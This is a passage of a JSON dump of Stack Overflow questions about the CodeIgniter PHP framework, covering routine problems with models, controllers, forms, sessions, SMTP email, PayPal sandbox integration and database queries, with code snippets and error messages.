','phone');echo '&lt;br&gt;';\n            echo form_input($CustCreationPhone);echo '&lt;br&gt;';\n    echo form_label('State: ','state');echo '&lt;br&gt;';\n            echo form_dropdown('states',$CustCreationState,'Alabama');echo '&lt;br&gt;';\n    echo form_label('Number of Applications: ','numapps');echo '&lt;br&gt;';\n            echo form_input($CustCreationNumApps);echo '&lt;br&gt;';\n    echo form_label('Version Control: ','versCntrl');echo '&lt;br&gt;';\n            echo form_dropdown('versCntrl',$CustCreationVerCntrl,'Subversion'); echo '&lt;br&gt;';\n    echo form_label('How often do you test? ','testFreq');echo '&lt;br&gt;';\n            echo form_dropdown('freq',$CustCreationTestFreq,'Daily');echo '&lt;br&gt;';\n    echo form_submit($CustCreationSubmit,'Submit');    \n?&gt; \n</code></pre>\n\n<p>but after i submit I get the following error:\n<img src=\"http://i.stack.imgur.com/ljn3i.png\" alt=\"img2\"></p>\n\n<p>Is it throwing this error because the file clientcreationmodel.php isnt the same naming convention of clientcreation.php as with the view and controller ?</p>\n\n<p>If I try to modify the model class in the model as <code>class Classcreation extends CI_Model{}</code> it throws the error: <code>Fatal error: Cannot redeclare class Clientcreation</code> . What should I do here?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13240111,"title":"CodeIgniter 2 not allowing multiple level subfolders for controllers","body":"<p>As I read the <a href=\"http://codeigniter.com/user_guide/general/controllers.html\" rel=\"nofollow\">doc</a>, controllers in CodeIgniter are supposed to support multiple level subfolders, but as far as I have tested, it is impossible to work after first a first level folder.</p>\n\n<p>By example:</p>\n\n<p><code>mysite.dev/</code> (index page, default controller home.php, works)</p>\n\n<p><code>mysite.dev/admin/</code> (admin section, in admin/home.php, works)</p>\n\n<p><code>mysite.dev/admin/manage/</code> (in admin/manage/home.php, do not work)</p>\n\n<p>I am trying to know why and how to make it work on multiple level sub folders? </p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["jquery","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":13223148,"title":"Display SQL data with JQUERY tabs","body":"<p>I want to redesign keyboard app to touchscreen app for a bar ( I am using Codeigniter).</p>\n\n<p>I want that articles is displayed in two parts:\n1. List of all the article_category \n2. Below the tabs that selected article_category display article_name+article_price+article_image</p>\n\n<p>VINES BEERS DRINKS&lt;-categories</p>\n\n<p>WHITE VINE        &lt;-different aricle names under tab VINES</p>\n\n<p>RED VINE</p>\n\n<p>MERLOT\nCABERNET</p>\n\n<p>I have SQL table articles with struct:\narticle_id\naricle_name\narticle_category\narticle_price\narticle_image</p>\n\n<p>Looking for a solution, i found that JQUERY tabs will help me to solve a problem.</p>\n\n<p>I found the CI cart demo on the web. I replaced its database with my.\nIt is working as expacted for tabs! I got all the categories listed in tabs.</p>\n\n<p>But i dont know how to get the data for selected tab(look into category.php) ?</p>\n\n<p>My  file: app/controllers/cart.php</p>\n\n<pre><code>&lt;?php\n    class Cart extends Controller { // Our Cart class extends the Controller class\n        function Cart()\n        {\n            parent::Controller(); // We define the the Controller class is the parent.\n\n            $this-&gt;load-&gt;model('cart_model'); // Load our cart model for our entire class\n        }\n        function index()\n        {\n            $data['categories'] = $this-&gt;cart_model-&gt;retrieve_category(); // Retrieve an array with all categories\n            $data['products'] = $this-&gt;cart_model-&gt;retrieve_products(); // Retrieve an array with all products\n            $data['content'] = 'cart/categories'; // Select view to display\n            $this-&gt;load-&gt;view('index', $data); // Display the page\n        }\n    }\n</code></pre>\n\n<p>My  file: app/models/cart_model.php</p>\n\n<pre><code>&lt;?php\nclass Cart_model extends Model {\n    // Function to retrieve an array with all product information\n    function retrieve_products(){\n        $query = $this-&gt;db-&gt;get('phppos_item_kits');\n        return $query-&gt;result_array();\n    }\n    // Function to retrieve an array with all product information\n    function retrieve_category(){\n        $this-&gt;db-&gt;select('distinct(category)');\n        $this-&gt;db-&gt;from('phppos_item_kits');\n        $query = $this-&gt;db-&gt;get();\n        return $query-&gt;result_array();\n    }\n}\n</code></pre>\n\n<p>My  file: app/views/cart/categories.php</p>\n\n<pre><code>&lt;head&gt;\n&lt;link href=\"&lt;?php echo base_url(); ?&gt;assets/js/base/jquery-ui.css\" media=\"screen\" rel=\"stylesheet\" type=\"text/css\"/&gt;\n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url(); ?&gt;assets/js/jquery-1.8.2.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url(); ?&gt;assets/js/base/jquery-ui.js\"&gt;&lt;/script&gt;\n  &lt;script&gt;\n  $(document).ready(function() {\n    $(\"#tabs\").tabs({event: \"mouseover\"});\n  });\n  &lt;/script&gt;\n&lt;/head&gt;\n&lt;div id=\"tabs\"&gt;\n    &lt;ul&gt;\n    &lt;?php foreach($categories as $c): ?&gt;\n        &lt;li&gt;&lt;a href=\"#fragment\"&gt;&lt;span&gt;&lt;?php echo $c['category']; ?&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;\n    &lt;?php endforeach;?&gt;\n    &lt;/ul&gt;\n        &lt;div id=\"fragment\"&gt;\n        &lt;?php foreach($products as $p): ?&gt;\n                &lt;li&gt;&lt;?php echo $p['name']; ?&gt;,&lt;?php echo $p['category']; ?&gt;&lt;/li&gt;\n        &lt;?php endforeach;?&gt;\n        &lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>My  file: app/views/index.php</p>\n\n<pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;\n&lt;html xml:lang=\"en-us\" xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;\n&lt;title&gt;CodeIgniter Shopping Cart&lt;/title&gt;\n&lt;link href=\"&lt;?php echo base_url(); ?&gt;assets/js/base/jquery-ui.css\" media=\"screen\" rel=\"stylesheet\" type=\"text/css\"/&gt;\n&lt;link href=\"&lt;?php echo base_url(); ?&gt;assets/css/core.css\" media=\"screen\" rel=\"stylesheet\" type=\"text/css\" /&gt;\n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url(); ?&gt;assets/js/jquery-ui.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url(); ?&gt;assets/js/jquery-1.8.2.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url(); ?&gt;assets/js/core.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;div&gt;\n    &lt;?php $this-&gt;view($content); ?&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","activerecord"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13240611,"title":"Insert one row for each element in array in one query","body":"<p>I have an array with multiple elements. The size of the array isn't always the same.</p>\n\n<p>At the moment the only way I can think of doing is using a <code>foreach</code> loop and querying the database once for every element in the array. </p>\n\n<p>What I am looking for a way to insert one row for one element in the array but all in one query. I would like to do is using codeigniter's active record class so that I wouldn't have to write code to check for malicious data and such.</p>\n"},{"tags":["codeigniter","paypal-sandbox","ci-merchant"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13224575,"title":"CodeIgniter, CI-Merchant and Paypal Sandbox","body":"<p>I'm trying to make a little shopping cart with CodeIgniter and I found CI-Merchant to work with payment gateways with this guide <a href=\"http://ci-merchant.org/\" rel=\"nofollow\">http://ci-merchant.org/</a> but I don't really understand how to make it works with Paypal Sandbox.</p>\n\n<pre><code>$this-&gt;load-&gt;library('merchant');\n$this-&gt;merchant-&gt;load('paypal_express');\n$settings = array(\n    'username' =&gt; 'test@test.com',\n    'password' =&gt; '********',\n    'signature' =&gt; 'Test Store',\n    'test_mode' =&gt; true);\n\n$this-&gt;merchant-&gt;initialize($settings);\n$params = array(\n    'amount' =&gt; 12.00,\n    'currency' =&gt; 'CAD',\n    'return_url' =&gt; 'http://payment.test.com',\n    'cancel_url' =&gt; 'http://payment.test.com/cancel');\n\n$response = $this-&gt;merchant-&gt;purchase($params);\n$this-&gt;load-&gt;view('welcome_message');\n</code></pre>\n\n<p>I know that this code can't do much but it do nothing at all. Just load the view and nothing happens, I don't understand. So, my question is, do you know tutorials or just how to make CI Merchant works with Paypal Sandbox? Thanks for the help.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13206852,"title":"popup contact form with validation","body":"<p>I would like to create popup contact form with validation like i did here <code>http://89.212.111.174/delovtujini.si</code> and click “VPIS V BAZO”.</p>\n\n<p>You will get popup where you can fill contact form. How can i do this with CI? Here on this example i do everything in the same html page. In CI i try to create new controller for contat form but i dno’t know how to open the window. I also try to use <a href=\"http://fancyapps.com/fancybox/\" rel=\"nofollow\">http://fancyapps.com/fancybox/</a> I try. but none solution works.</p>\n\n<p>Can someone explain me how to do? Maybe is better to use <a href=\"https://github.com/EllisLab/CodeIgniter/wiki/Ajax-Framework-For-CodeIgniter\" rel=\"nofollow\">https://github.com/EllisLab/CodeIgniter/wiki/Ajax-Framework-For-CodeIgniter</a></p>\n\n<p>Thx</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":8,"view_count":67,"score":-8,"question_id":13204598,"title":"Delete a user from a membership model","body":"<pre><code>class Deleteuseraccount extends CI_Controller {\n\n    function Deleteuseraccount() {\n        parent::__construct();\n\n        $username = $this-&gt;session-&gt;userdata('username');\n\n        $this-&gt;membership-&gt;deleteUser($username);\n\n        $this-&gt;session-&gt;sess_destroy();\n\n        redirect('start');\n\n    }\n\n}\n\n\nfunction deleteUser($username) {\n\n    $deleteMember = $this-&gt;db-&gt;select('*')-&gt;from('membership')-&gt;where('username', $username);\n\n    $delete = $this-&gt;db-&gt;delete('membership', $deleteMember);\n\n}\n</code></pre>\n\n<p>I'm currently trying to delete a member from the membership model and getting these error messages:</p>\n\n<blockquote>\n  <p>A PHP Error was encountered<br> Severity: Notice<br> Message:\n  Undefined property: <code>Deleteuseraccount::$membership</code><br> Filename:\n  controllers/deleteuseraccount.php<br> Line Number: 10<br></p>\n</blockquote>\n\n<p>and on the same line: </p>\n\n<blockquote>\n  <p>Fatal error: Call to a member function <code>deleteUser()</code> on a non-object in\n  deleteuseraccount.php on line 10</p>\n</blockquote>\n\n<p>so I appear to be having issues with this line of code: </p>\n\n<pre><code>$this-&gt;membership-&gt;deleteUser($username);\n</code></pre>\n"},{"tags":["wordpress","codeigniter","url","seo","rebuild"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13240099,"title":"Rebuild wordpress site with codeigniter","body":"<p>I have a client that has a website that is built with WordPress. They want to expand the site adding new features. To me it seems best to rebuild the site so WP is not being used. I like using codeigniter but one issue is how we keep our SEO rankings.</p>\n\n<p>The urls in WP are something like www.foo.com/test-this-site.html</p>\n\n<p>Is there a way to build the site in Codeigniter but utilize that URL structure? I basicly need to keep all the current pages working at the same url.</p>\n\n<p>Does anyone know if this is possible with Codeigniter and how this may affect search ranking? Or is there a better way to go about this. Any sort of direction would be helpful</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13238779,"title":"On MAMP can I send php errors to a \"per-test-site log\"? Or must all errors go to MAMP/logs/php_error.log","body":"<p>I guess the title says it all.</p>\n\n<p>Since I have a number of test-sites running in MAMP/htdocs, do all of the errors for all test-sites have to go to the single php_error.log?  Can I change this? (I know I can change the log location in php.ini, but I see no way to \"divide it up\")</p>\n\n<p>The trouble comes from installing \"fire_log\" logging Spark on one of my CodeIgniter test sites and it seems to want to look for log files relative to the Codeigniter Install.  That's what I'm thinking anyway, since it it not finding my logs.  </p>\n\n<p>I think it wants to see   MAMP/CI_test_site/logs/php_error.log</p>\n\n<p>And I've obviously got</p>\n\n<pre><code>/MAMP\n   /logs\n       php_error.log\n   /htdocs\n       /CI_test_site\n          /..folders\n       /Other_site\n       /DIfferent_site\n</code></pre>\n\n<p>So do I have any control over this in MAMP?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":109,"score":1,"question_id":13153249,"title":"unable to send email from gmail smtp server using codeIgniter?","body":"<p>I don't know where i am doing wrong. I am following codeIgniter user guide only. I pasting code of controller...............</p>\n\n<pre><code>function do_upload()\n{\n    $config['upload_path'] = 'C:\\xampp\\htdocs\\upload\\application';\n    $config['allowed_types'] = 'doc|docx|pdf';\n    $config['max_size'] = '10240';\n\n    $this-&gt;load-&gt;library('upload', $config);\n\n    if ( ! $this-&gt;upload-&gt;do_upload())\n    {\n        $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n        $this-&gt;load-&gt;view('upload_form', $error);\n    }\n    else\n    {\n        $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n        echo \"Resume Successfully uploaded to database.............\";\n    }\n\n    $file = $data['upload_data']['full_path'];\n\n    $config = Array(\n      'protocol' =&gt; 'smtp',\n      'smtp_host' =&gt; 'ssl://smtp.googlemail.com',\n      'smtp_port' =&gt; 465,\n      'smtp_user' =&gt; '****************', // change it to yours\n      'smtp_pass' =&gt; '******', // change it to yours\n      'mailtype' =&gt; 'html',\n      'charset' =&gt; 'iso-8859-1',\n      'wordwrap' =&gt; TRUE\n    );\n\n      $this-&gt;load-&gt;library('email', $config);\n      $this-&gt;email-&gt;set_newline(\"\\r\\n\");\n      $this-&gt;email-&gt;from('*************'); // change it to yours\n      $this-&gt;email-&gt;to('***************'); // change it to yours\n      $this-&gt;email-&gt;subject('Email using Gmail.');\n      $this-&gt;email-&gt;message('Working fine ! !');\n\n      if($this-&gt;email-&gt;send())\n     {\n      echo 'Email sent.';\n     }\n     else\n    {\n     show_error($this-&gt;email-&gt;print_debugger());\n    }\n}\n</code></pre>\n\n<blockquote>\n  <p>The following SMTP error was encountered: 185667876 Unable to find the\n  socket transport \"ssl\" - did you forget to enable it when you\n  configured PHP? Unable to send data: AUTH LOGIN Failed to send AUTH\n  LOGIN command. Error:  Unable to send data: MAIL FROM:</p>\n  \n  <p>from:  The following SMTP error was encountered:  Unable to send data:\n  RCPT TO:</p>\n  \n  <p>to:  The following SMTP error was encountered:  Unable to send data:\n  DATA</p>\n  \n  <p>data:  The following SMTP error was encountered:  Unable to send data:\n  User-Agent: CodeIgniter Date: Wed, 31 Oct 2012 08:36:21 +0100 From:\n  Return-Path: To: test@example.com Subject:\n  =?iso-8859-1?Q?Email_using_Gmail.?= Reply-To: \"test@example.com\" X-Sender:\n  test@example.com X-Mailer: CodeIgniter X-Priority: 3\n  (Normal) Message-ID: &lt;5090d4f5df7bb@gmail.com> Mime-Version: 1.0\n  Content-Type: multipart/alternative; boundary=\"B_ALT_5090d4f5df7d8\"\n  This is a multi-part message in MIME format. Your email application\n  may not support this format. --B_ALT_5090d4f5df7d8 Content-Type:\n  text/plain; charset=iso-8859-1 Content-Transfer-Encoding: 8bit Working\n  fine ! ! --B_ALT_5090d4f5df7d8 Content-Type: text/html;\n  charset=iso-8859-1 Content-Transfer-Encoding: quoted-printable Working\n  fine ! ! --B_ALT_5090d4f5df7d8-- Unable to send data: .</p>\n  \n  <p>The following SMTP error was encountered:  Unable to send email using\n  PHP SMTP. Your server might not be configured to send mail using this\n  method.</p>\n</blockquote>\n"},{"tags":["jquery","ajax","codeigniter","frameworks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13237567,"title":"Jquery vs ajaxframework on codeigniter","body":"<p>I have a choice between two AJAX frameworks: jQuery (AJAX components) and AJAX framework built for CodeIgniter. I'd like to know which is easier to learn and which is faster?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13238262,"title":"How to loop through form fields including datagrid checkbox in php and codeigniter","body":"<p>How do i loop form elements and get values and than save to database, i have 5 form input and i have datagrid with checkbox to select row...</p>\n\n<p>so i wanted to know how to perform same using php and codeigniter.,,,, i really need help to solve the problem.</p>\n\n<pre><code> function showattendee($id)\n{\n    // set validation properties\n    $this-&gt;_set_rules();\n\n    // prefill form values\n    $person = $this-&gt;Person_model-&gt;get_by_id($id)-&gt;row();\n    $this-&gt;form_data-&gt;id = $person-&gt;tab_classid;\n    $this-&gt;form_data-&gt;classtitle = $person-&gt;tab_classtitle;\n    $this-&gt;form_data-&gt;classdate = $person-&gt;tab_classtime;\n    $this-&gt;form_data-&gt;createddate = $person-&gt;tab_crtdate;\n    $this-&gt;form_data-&gt;peremail = $person-&gt;tab_pemail;\n    $this-&gt;form_data-&gt;duration = $person-&gt;tab_classduration;\n    $uri_segment = 0;\n    $offset = $this-&gt;uri-&gt;segment($uri_segment);\n    $users = $this-&gt;User_model-&gt;get_paged_list($this-&gt;limit, $offset)- &gt;result();\n        $this-&gt;load-&gt;library('pagination');\n    $config['base_url'] = site_url('person/index/');\n    $config['total_rows'] = $this-&gt;User_model-&gt;count_all();\n    $config['per_page'] = $this-&gt;limit;\n    $config['uri_segment'] = $uri_segment;\n    $this-&gt;pagination-&gt;initialize($config);\n    $data['pagination'] = $this-&gt;pagination-&gt;create_links();\n    $this-&gt;load-&gt;library('table');\n    $this-&gt;table-&gt;set_empty(\"&amp;nbsp;\");\n    $this-&gt;table-&gt;set_heading('', 'User Id','User Name', 'Email', 'Language','Actions');\n    $i = 0 + $offset;\n    foreach ($users as $user)\n    {\n    $checkarray=array('name'=&gt;'chkclsid[]',\n            'id'=&gt;'chkclsid','value'=&gt;$user-&gt;user_id);\n\n            $this-&gt;table-&gt;add_row(form_checkbox($checkarray), \n            $user-&gt;user_id, $user-&gt;user_name, $user-&gt;user_email,$user-&gt;user_language, \n    anchor('person/view/'.$user-&gt;user_id,'view',array('class'=&gt;'view')).' '.\n    anchor('person/update/'.$user-&gt;user_id,'update',\n            array('class'=&gt;'update')).''. \n            anchor('person/showattendee/'.$user- &gt;user_id,\n           'Attendee',array('class'=&gt;'attendee')).' '.\n    anchor('person/delete/'.$user-&gt;user_id,'delete'\n            ,array('class'=&gt;'delete',\n            'onclick'=&gt;\"return confirm('Are you sure want to  delete this person?')\"))  \n        );\n    }\n    $data['table'] = $this-&gt;table-&gt;generate();\n\n\n    // load view\n    // set common properties\n    $data['title'] = 'Assign Attendees';\n    $data['message'] = '';\n    $data['action'] = site_url('person/validatecheckbox');\n    $data['value'] = \"sssssssssssssssssss\";\n    $data['link_back'] = anchor('person/index/',\n            'Back to list ofClasses',array('class'=&gt;'back'));\n\n    $this-&gt;load-&gt;view('common/header');\n    $this-&gt;load-&gt;view('adminmenu');\n    $this-&gt;load-&gt;view('addattendee_v', $data);\n\n\n    }\n</code></pre>\n\n<p>so i wanted to loop all form fields including checkbox value and pass to database to save data.</p>\n"},{"tags":["codeigniter","html.dropdownlist"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13237107,"title":"CodeIgniter Dropdown from query","body":"<p>I am new in codeIgniter and I having a bit of trouble with my database and dropdown menu.</p>\n\n<p>Here is my function to get the information I need...</p>\n\n<pre><code>protected $tbl_name = 'club';\n\npublic function get($id = 0, $object = TRUE)\n    {\n        // select * from users where id = 0\n        // check if id is provided\n        if($id) {\n            // id provided - retrieve a specific user\n            $query = $this-&gt;db-&gt;get_where($this-&gt;tbl_name, array('id' =&gt; $id));\n            // check if object type is requested\n            if($object) {\n                // object is requested\n                $data = $query-&gt;row();\n            }\n            else {\n                // array is requested\n                $data = $query-&gt;row_array();\n            }\n        }\n        else {\n            // id not provided - retrieve all users\n            $query = $this-&gt;db-&gt;get($this-&gt;tbl_name);\n            // check if object type is requested\n            if($object) {\n                // object is requested\n                $data = $query-&gt;result();\n            }\n            else {\n                // array is requested\n                $data = $query-&gt;result_array();\n            }\n        }\n        return $data;\n    }\n</code></pre>\n\n<p>Here is where I call it in my controller</p>\n\n<pre><code>$data['clubname'] = $this-&gt;club_model-&gt;get();\n</code></pre>\n\n<p>and this is in my view for the dropdown</p>\n\n<pre><code>&lt;tr&gt;&lt;td&gt;&lt;?php echo form_label('Club Name: ', 'clubname'); ?&gt;&lt;/td&gt;&lt;td&gt;&lt;?php echo form_dropdown('clubname', $clubname['name']); ?&gt;&lt;/td&gt;&lt;td&gt;&lt;?php echo form_error('clubname'); ?&gt;&lt;/td&gt;&lt;/tr&gt;\n</code></pre>\n\n<p>but I get these errors</p>\n\n<pre><code>A PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined index: name\n\nFilename: individual/individual_club.php\n\nLine Number: 7\nA PHP Error was encountered\n\nSeverity: Warning\n\nMessage: Invalid argument supplied for foreach()\n\nFilename: helpers/form_helper.php\n\nLine Number: 331\n</code></pre>\n\n<p>What Am I doing wrong?</p>\n"},{"tags":["arrays","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13235104,"title":"Save data from array in variable","body":"<p><strong>SOLVED!</strong></p>\n\n<p>I`m trying save data from array in variable. I have in controller:</p>\n\n<pre><code>$data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n</code></pre>\n\n<p>and I know that in this array are data about uploading file. One with this date is <code>\"file_name\"</code>, and I want to save this value in controller at variable. I try with:</p>\n\n<pre><code>$image_name= $data['file_name'];\n</code></pre>\n\n<p>But this not working. I use CodeIginter 2.1.3 framework.</p>\n\n<p><strong>Good solution is: $data['upload_data']['file_name'];</strong>\nThanks for help!</p>\n"},{"tags":["php","codeigniter","html-entities"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":87,"score":5,"question_id":13223967,"title":"How to set ENT_QUOTES flag by default for htmlentities() function in php","body":"<p>I am using <code>htmlentities($data, ENT_QUOTES)</code> on any data fetched from database before displaying it.</p>\n\n<p>Is there a way I can set the flag <code>ENT_QUOTES</code> by default for <code>htmlentities()</code> function, so that even if I write <code>htmlentities($data)</code> it should work as <code>htmlentities($data, ENT_QUOTES)</code>.</p>\n\n<p>As written in the documentation of php the default is <code>ENT_COMPAT | ENT_HTML401</code>.</p>\n\n<p>For your information I am using codeigniter framework, php5.</p>\n\n<p>UPDATE 1: wrapping with a custom function as suggested by Michael could help but I have already used this everywhere in the website without ENT_QUOTES flag and was wondering if there is a way provided by php to change defaults for its functions.</p>\n\n<p>UPDATE 2: I think html_escape() inbuilt function provided by codeigniter (suggested by Wesley) is the best for me so that i don't have to write my own wrapper function.</p>\n"},{"tags":["php","mysql","codeigniter","types","sqldatatypes"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13236002,"title":"CodeIgniter Active Record Return Mysql data types instead of just strings","body":"<p>I am using codeIgniter version 2.0.3.  I was wondering if there is a simple way to return data with the correct data type.  For example for schema:</p>\n\n<pre><code>+-------+--------------+------+-----+---------+----------------+\n| Field | Type         | Null | Key | Default | Extra          |\n+-------+--------------+------+-----+---------+----------------+\n| id    | int(11)      | NO   | PRI | NULL    | auto_increment |\n| term  | varchar(255) | NO   |     | NULL    |                |\n| level | int(11)      | NO   |     | NULL    |                |\n+-------+--------------+------+-----+---------+----------------+\n</code></pre>\n\n<p>active record <code>result_array</code> returns:</p>\n\n<pre><code>array(4) {\n  [0]=&gt;\n  array(3) {\n    [\"id\"]=&gt;\n    string(1) \"1\"\n    [\"term\"]=&gt;\n    string(11) \"Mesoamerica\"\n    [\"level\"]=&gt;\n    string(1) \"1\"\n  }\n  [1]=&gt;\n  array(3) {\n    [\"id\"]=&gt;\n    string(1) \"2\"\n    [\"term\"]=&gt;\n    string(6) \"Mexico\"\n    [\"level\"]=&gt;\n    string(1) \"1\"\n  }\n  [2]=&gt;\n  array(3) {\n    [\"id\"]=&gt;\n    string(1) \"3\"\n    [\"term\"]=&gt;\n    string(10) \"indigenous\"\n    [\"level\"]=&gt;\n    string(1) \"2\"\n  }\n  [3]=&gt;\n  array(3) {\n    [\"id\"]=&gt;\n    string(1) \"4\"\n    [\"term\"]=&gt;\n    string(5) \"ruins\"\n    [\"level\"]=&gt;\n    string(1) \"2\"\n  }\n}\n</code></pre>\n\n<p>The idea is to have the types come through on the result sets.  <code>ID</code> should be <code>INTEGER</code>, and <code>level</code> should be <code>INTEGER</code>.  I normally just typecast the data that I need to use.  I did not see any way to push this on codeIgniter in the documentation, but am hoping that there is an easy way to do this.  I have seen ways to do this in PDO but does codeIgniter provide some sort of convenience to do this for me?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13235284,"title":"codeigniter session values are overwritten","body":"<p>In my view I have the following code:</p>\n\n<pre><code>  if (($news['newsvideo'] !=\"\") || ($news['newsvideo'] != NULL)) {\n\n     $newdata4 = array(\n     'tablename'  =&gt; 'news',\n     'recordid'     =&gt; $news['newsid'],\n     'fieldname' =&gt; 'newsid',\n     'fieldToUpdate' =&gt; 'newsvideo',\n     'dpage' =&gt; 'news/editNews'\n     );\n\n     $this-&gt;session-&gt;set_userdata($newdata4);\n     echo anchor('news/updateOneField', 'Delete Video?','class=btn');\n }\n\n  if (($news['newsvideo_en'] !=\"\") || ($news['newsvideo_en'] != NULL)) {\n\n     $newdata5 = array(\n     'tablename'  =&gt; 'news',\n     'recordid'     =&gt; $news['newsid'],\n     'fieldname' =&gt; 'newsid',\n     'fieldToUpdate' =&gt; 'newsvideo_en',\n     'dpage' =&gt; 'news/editNews'\n     );\n\n     $this-&gt;session-&gt;set_userdata($newdata5);\n     echo anchor('news/updateOneField', 'Delete Video?','class=btn');\n }\n</code></pre>\n\n<p>Function in my controller is the following:</p>\n\n<pre><code>public function updateOneField() \n    {  \n\n        $tablename = $this-&gt;session-&gt;userdata('tablename');\n        $id = $this-&gt;session-&gt;userdata('recordid');\n        $fieldname = $this-&gt;session-&gt;userdata('fieldname');\n        $fieldToUpdate = $this-&gt;session-&gt;userdata('fieldToUpdate');   \n        //$this-&gt;newsModel-&gt;save(array($fieldToUpdate =&gt; ''), $id);        \n        //$newsid = $id;\n\n        echo \"Table name: \". $tablename . \"&lt;br/&gt;\";\n        echo \"Id: \" . $id. \"&lt;br/&gt;\";\n        echo \"Field name: \" . $fieldname. \"&lt;br/&gt;\";\n        echo \"Field to update: \" . $fieldToUpdate. \"&lt;br/&gt;\";\n        die();\n        // destroy the session after the update\n        $this-&gt;session-&gt;unset_userdata('tablename');\n        $this-&gt;session-&gt;unset_userdata('recordid');\n        $this-&gt;session-&gt;unset_userdata('fieldname');\n        $this-&gt;session-&gt;unset_userdata('fieldToUpdate');\n\n        $this-&gt;displayEditNewsForm($newsid);\n    } \n</code></pre>\n\n<p>Now, if i click on the first link i want to delete newsvideo, when try to update the newsvideo field, newsvideo_en is updated. That means that I overwrite the values of the array later. Does anyone has idea how to avoid that, and to update the correct field?</p>\n\n<p>Regards,Zoran</p>\n"},{"tags":["php","codeigniter","post"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13234744,"title":"No Post Data to Controller","body":"<p>I have a simple form built in a CodeIgniter view:</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;&lt;/title&gt;\n&lt;base href=\"&lt;?php echo site_url(); ?&gt;\" /&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;?php echo form_open('main/testformout'); ?&gt;\nFirst name: &lt;input type=\"text\" name=\"fname\" /&gt;&lt;br&gt;\nLast name: &lt;input type=\"text\" name=\"lname\" /&gt;\n&lt;input type=\"submit\" name=\"submit\" value=\"Submit\" /&gt;\n&lt;/form&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>EDIT: Here is the HTML output of the form above:</p>\n\n<pre><code>&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n\n&lt;form method=\"post\" action=\"http://www.mypage.com/main/testformout\"&gt;\nFirst name: &lt;input type=\"text\" name=\"fname\" /&gt;&lt;br&gt;\nLast name: &lt;input type=\"text\" name=\"lname\" /&gt;\n&lt;input type=\"submit\" name=\"submit\" value=\"Submit\" /&gt;\n&lt;/form&gt;\n\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>I have tried it with and without the form helpers but in this example I am using the form_open helper.  </p>\n\n<p>When hitting the submit button no POST data makes it to the Controller.</p>\n\n<p>Controller Code:</p>\n\n<pre><code>    public function helperin()\n    {\n        $this-&gt;load-&gt;view('test/helperin_v', NULL);\n    }\n    public function testformout()\n    {\n        print_r($_POST);\n        echo \"&lt;br /&gt;\";\n        echo $_SERVER['REQUEST_METHOD'];\n        echo \"&lt;br /&gt;\";\n                var_dump($this-&gt;input-&gt;post());\n        $this-&gt;load-&gt;view('test/out_v', $viewData[$_POST]);\n    }\n</code></pre>\n\n<p>When the system and application folders are loaded at the same level as the public_html folder I get this result:</p>\n\n<pre><code>GET\nbool(false)\n</code></pre>\n\n<p>When the system and application folders are loaded inside the public_html folder (I know this is not secure) I get this 